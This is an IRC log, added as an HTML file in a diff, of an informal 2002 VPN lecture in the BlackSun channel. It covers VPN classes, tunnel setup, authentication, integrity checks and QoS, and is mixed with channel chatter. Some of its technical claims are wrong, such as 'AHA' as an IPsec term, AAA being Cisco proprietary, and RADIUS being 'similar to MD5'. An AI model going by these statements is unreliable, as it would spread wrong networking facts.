@@ -1,0 +1,1595 @@
+<HTML><HEAD><TITLE>Virtual Private network [VPN] Lecture</TITLE>
+<STYLE>@page  {margin-left: 3.18cm; margin-right: 3.18cm; margin-top: 2.54cm; margin-bottom: 2.54cm; }
+</STYLE>
+</HEAD>
+<BODY lang=en-US>
+<hr color="#000000" width="50%" size="1"><center>
+Virtual Private network [VPN] Lecture<br>
+By _Jonah_<br>
+For <br>
+Blacksun Research Facility [BSRF]<br>
+<a href="http://blacksun.box.sk">
+http://blacksun.box.sk</a><br>
+<hr color="#000000" width="65%" size="1"></center>
+
+<P style="MARGIN-BOTTOM: 0cm">&nbsp;</P>
+<P style="MARGIN-BOTTOM: 0cm">**** BEGIN LOGGING AT Mon Jul 8 22:50:20 2002</P>
+<P style="MARGIN-BOTTOM: 0cm">--&gt; You are now talking on #bsrf</P>
+<P style="MARGIN-BOTTOM: 0cm"><b>--- Topic for #bsrf is '.:: BlackSun Research 
+Facility (<a href="http://blacksun.box.sk"><br>
+http://blacksun.box.sk</a>) ::. || Nothing illegal || Send in your BSRF 
+logos for the contest to Mikkkeee or AZTEK || email Simprix 
+(simprix@simprix.net) concerning lectures || lecture 07/08/02 at 11PM EST (4 am 
+GMT) on VPNS, by _Jonah_ || <a href="http://fusion.dyn.ee/bsrf2.gif">http://fusion.dyn.ee/bsrf2.gif</a></b></P>
+<P style="MARGIN-BOTTOM: 0cm">--- Topic for #bsrf set by AZTEK at Sun Jul 7 
+10:08:49</P>
+<P style="MARGIN-BOTTOM: 0cm">--- ChanServ gives channel operator status to 
+simprix</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;DigitalFallout&gt; &lt;---START 
+LECTURE---&gt;</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; VPN =</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; Virtual Private network</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; the concept behind it is really 
+simple</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; although the implmentation is 
+not</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; e.g a company has branches that 
+are connected to a shared/public network</P>
+<P style="MARGIN-BOTTOM: 0cm">--&gt; _bAss 
+(ffffffffff@TCydwnX3BaI.a.004.syd.iprimus.net.au) has joined #bsrf</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; i.e. internet</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; and there some sorta data being 
+transacted</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; b/w two branches on that shared 
+network</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; the old days</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; way back early 90's :-p</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; if there was transactions being 
+done on the shared network</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;-- b0ttyburp 
+(b0ttyburp@7cZDwowQs8M.blueyonder.co.uk) has left #bsrf</P>
+<P style="MARGIN-BOTTOM: 0cm">--&gt; b0ttyburp 
+(b0ttyburp@7cZDwowQs8M.blueyonder.co.uk) has joined #bsrf</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; there was no security meassure 
+inplace on the physical data</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; soooo</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; happy hacker b0ttyburp was having 
+a field day</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; then some genious</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; well actualy</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; encryption been around for 
+ages</P>
+<P style="MARGIN-BOTTOM: 0cm">--&gt; scaal (eat@VP4FadmQevg.vic.bigpond.net.au) 
+has joined #bsrf</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; bleh</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; i forgot to mention</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; b/c that data was insecure</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; corporations leased lines</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; for telco co.</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; for point -to point</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; connections</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; that of course was extremely 
+costly</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; then VPN came a long</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; what VPN does</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; is on that shared network</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; it creates a virtual private 
+network ... hence VPN</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;-- [PhaLanX] 
+(phalanx@RPhz99t4THk.codetel.net.do) has left #bsrf</P>
+<P style="MARGIN-BOTTOM: 0cm">--&gt; [PhaLanX] 
+(phalanx@RPhz99t4THk.codetel.net.do) has joined #bsrf</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; by boaring a path between two 
+entities</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;-- Pike has quit ()</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; typically a Corp. Branch and a 
+smaller branch</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;-- Jason has quit (.:touchstone:.)</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; let me mention</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; what's really pushing this 
+technology is</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; globalization</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; and multinational corp, that need 
+to communicate</P>
+<P style="MARGIN-BOTTOM: 0cm">--&gt; c0ld 
+(c0ld@10LEG6SNXrg.chcgil2.dsl-verizon.net) has joined #bsrf</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; and would be physically impossible 
+to drop a piece of fiber from USA to KOREA</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; and the fact that telecomuters 
+need access to company resources that are secure</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; questions?</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; -m</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; well I'm sure you guys are smart 
+enough to understand this so far</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; well</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;linuxlogic&gt; can VPN's be setup using any 
+OS?</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; q's?</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;hydeph&gt; continue</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_bAss&gt; this must be a lecture right</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; it is not OS dependant</P>
+<P style="MARGIN-BOTTOM: 0cm">linuxlogic LiquidCrystalDismay &lt;hydeph&gt; por 
+favor</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; but i will get into that</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_bAss&gt; =D</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; no more questions relative to 
+what i just said?</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;th0rn&gt; hmm.... so are vpn's a whole other 
+type of topology?</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; VPNs are a logical and Physical 
+topology</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; i wil get into that</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;th0rn&gt; k</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; i think everyone is on the ball so 
+far</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; there are 3 classes of VPNs</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;th0rn&gt; ya, i was jus wondering how they are 
+layed out</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; A. Remote Dial in.....</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; those users will have a desire for 
+co. resources on an infrequent bases</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; or are constantly changing 
+physical locations</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; B. Always connected</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; connected</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; those are small branches, like a 
+cellular store </P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; or retail outless</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; or home telecommuters that need 
+permanent access</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; ... sorry for my spelling</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; and lastly</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; C. The Extranet class</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; this is a newly defined class of 
+the internet</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; essential</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; essentially</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; it is for large corp to 
+communicate with each other</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; and transfer critical data over 
+large geographic WANs</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; ok</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; there are a few fundamentals</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; that need to me taken heed of when 
+deploying a VPN</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;-- piksel has quit (Ping timeout: 180 
+seconds)</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;simprix&gt; ready to continue</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; What type of security will you 
+employ, encryption type,, type of tunneling,, type of authen tication</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; B. What sorta QoS requirements 
+will ur deploy</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; QoS quality of service...</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; some QoS techniques would be 
+traffic shaping, packet prioritizing</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; packet queing</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; etc</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; and C. How will the VPN be 
+manage</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; btw i have my lecture notes on ftp 
+after this i'l put it up</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; AA. Security for VPN</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; (now i'm going to be referencing the 
+those three fundamentals)</P>
+<P style="MARGIN-BOTTOM: 0cm">--&gt; aphrael 
+(aphrael@NTCS7oS6MSA.dialup.mindspring.com) has joined #bsrf</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; the VPN is like i already said 
+connected across a shared network</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; i.e a tunnel</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; it is a Point-to-point 
+connection</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; between two nodes</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; the first process of </P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; initiating a VPN </P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; connecting</P>
+<P style="MARGIN-BOTTOM: 0cm">--&gt; guest284 (dick@k2UJmRwJyT2.64.5.220.O) has 
+joined #bsrf</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; is the process called Tunnel 
+Setup</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; this process involves 
+authentication</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; typically MD5...(message digest 
+5)</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; triple A authentication ....</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; AAA- 
+Authentication, authorization &amp;accounting</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; thats based on radius and 
+tacacs</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; and you can use radius and 
+tacas</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; once the tunnel is 
+established</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; encryption begins</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; the last part</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; of security for the vpn</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; is to include some type of data 
+integrity checking</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; this is typically done by 
+protocols like</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; IPsec/SAP which i will describe 
+further in a bit</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; Beyond ensuring no other devices 
+interact (i.e. happy hacker b0ttyburp)</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; packet integrity should be 
+accounted for </P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; using new headers</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; attentuation, and packet 
+detriorzation should be tested</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; using ESP,AHA</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; SHA</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; AHA=algorithm hasing 
+authentication</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; dont hoold me to it but i think 
+that's it</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; and SHA secure hasing algorithm</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; algorithm</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; and lastly</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; lastly</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; there must be a firewall wall in 
+place (i say must but it is not a required element)</P>
+<P style="MARGIN-BOTTOM: 0cm">--&gt; piksel (none@ppqhKcCIihHc.oakland.cmc.net) 
+has joined #bsrf</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; this fire wall can be either 
+software, </P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;-- Ralph[a 
+(Ralph@Ay7Xh0V8gbbw.gen.pacificcoast.net) has left #bsrf</P>
+<P style="MARGIN-BOTTOM: 0cm">--&gt; Ralph 
+(Ralph@Ay7Xh0V8gbbw.gen.pacificcoast.net) has joined #bsrf</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; packet filter like ipfw/ipf</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; or cisco pix</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; etc</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; lol</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; ok</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; now on to QoS..</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; well</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; actually questions?</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;Ralph&gt; no!</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;Ralph&gt; i guess not many could ask</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;Ralph&gt; with +m on</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; can you -m</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;Ralph&gt; no</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;Ralph&gt; i'm not an op</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;Ralph&gt; but you are</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; well i don't know how to do it</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; oh well</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; oh wells</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;Ralph&gt; hehe</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; ok</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;Ralph&gt; well, everyone!</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; well that was VPN security 
+fundamentals</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;Ralph&gt; message _Jonah_ for questions</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; now i mentioned</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; ok</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; ok</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;&lt;Phaedrus&gt; How is the encryption 
+handled?</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; encryption i will get into</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; but </P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;hydeph&gt; radius and tacas are what</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; there's different methods like 
+DES,3DES,ipsec</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; etc</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; hydeph: those are authentication 
+protocols</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; similar to MD5</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;th0rn&gt; wait, jonah, so a vpn is simply a 
+p2p link between two shared networks? (jus need a confirmation)</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; exactly</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;th0rn&gt; k</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;Phaedrus&gt; (thought radius was a dialup user 
+directory like X.400)</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;Ralph&gt; can i ask an off topic question?</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; hydeph: simply its the protocols 
+used for authentication exchange...</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; sure</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;hydeph&gt; ok</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;hydeph&gt; got it</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;Ralph&gt; how do you eat gummy bears?</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; btw AAA is cisco proprietary</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; bite the heads off</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;Ralph&gt; ok</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;Ralph&gt; and then eat the rest?</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; of course</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;Ralph&gt; hm</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; those things are delicous</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;th0rn&gt; wait, so do p2p links between public 
+networks or public and private networks have any special names?</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;Ralph&gt; i eat them differently</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;Ralph&gt; first, bite the head of</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; hmm</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; well</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; in the olden days</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;Ralph&gt; then grab them with your thumb and 
+index finger</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; p2p was over uucp</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; or dial up</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;Ralph&gt; so your thumb points at their 
+backs</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;Ralph&gt; and rip their back open with your 
+thumb</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; like when you dial up to AOL ;-p 
+its a direct connection to their server</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;Phaedrus&gt; (no it's not)</P>
+<P style="MARGIN-BOTTOM: 0cm">--&gt; dminus01 
+(dminus0123@wYX39ukTdeI.ipt.aol.com) has joined #bsrf</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;th0rn&gt; heheh, unfortunately ;-p</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;hydeph&gt; ralph: you have to bite off their 
+extremeities first</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; ok</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;hydeph&gt; the little nub feet and arms</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;Ralph&gt; hydeph, too small</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; so i shal continue with QoS</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;hydeph&gt; it takes skill</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;Ralph&gt; hm, possibly</P>
+<P style="MARGIN-BOTTOM: 0cm">--&gt; _Trick- 
+(Trickwitha@j5vFjKG7x6Y.ncl0103.ncl.iprimus.net.au) has joined #bsrf</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;Ralph&gt; i like back ripping more</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;th0rn&gt; so p2p links between other types of 
+networks don't have any special names?</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;b0ttyburp&gt; pls carry on very good so far 
+happyhacker approved grrrrrrr... nice1 DF for kicking asshole</P>
+<P style="MARGIN-BOTTOM: 0cm">--&gt; Guest1021 (kf26t3a@mtdCfs6iqTg.eseenet.com) 
+has joined #bsrf</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; they are callled p2p links</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;DigitalFallout&gt; lol</P>
+<P style="MARGIN-BOTTOM: 0cm">--&gt; rpc (rpc@pph7OxP7b1uY.unholy.net) has 
+joined #bsrf</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; vpn just imparts security over 
+those p2p links</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; and the p2p in VPN is VIRTUAL</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; although the packets are sent 
+through public network</P>
+<P style="MARGIN-BOTTOM: 0cm">--- rpc is now known as _rpc-</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; since ints encrypted its provides 
+a virtual p2p</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; i hope that cleared that up for 
+you</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; ok next QoS for VPNs</P>
+<P style="MARGIN-BOTTOM: 0cm">--&gt; T]-[3_RiPP3R 
+(Iooksharp3@1yisbvVaugQ.fibertel.com.ar) has joined #bsrf</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;-- T]-[3_RiPP3R 
+(Iooksharp3@1yisbvVaugQ.fibertel.com.ar) has left #bsrf</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; unlike regualr tcp/ip trans</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; you beat me</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; ;-p</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;DigitalFallout&gt; :)</P>
+<P style="MARGIN-BOTTOM: 0cm">--- Guest1021 is now known as kf26t3a</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; ulike regular tcp/ip transport</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; well lemme explain regular</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; you got a packet</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; suppose ur on DSL</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; and ur downloading something from 
+yahoo</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; the data gets sent around the 
+internet crossing routers</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; and that data is inspected at each 
+router (each hop)</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; for data integrity</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; etc</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; well not every hop</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; but</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; nevertheless</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; its hard to ensure QoS in a VPN 
+environment beacuse</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; i hope i'm not getting ahead of 
+myself</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; but just take this in stride i 
+will explain it later</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; on packet formation</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; btw</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; 
+http://unixd.com:81/lecture/vpn1.gif</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; i put a graphic</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; of a vpn up on there</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; ok</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; i sure i gave you enough time to 
+get it</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; well</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; QoS is imparted in a VPN</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;-- hydeph has quit ()</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; by redesigning of the headers</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; since the headers are different in 
+VPN compared to</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; those in regular TCP/IP 
+transport</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; the intermediate</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; routers are unable to do the 
+regular checksum test for integrity</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; so</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; the QoS is primarily done at both 
+endpoint</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; endpoints</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; of the p2p connectok</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; connections</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; shit</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; connection</P>
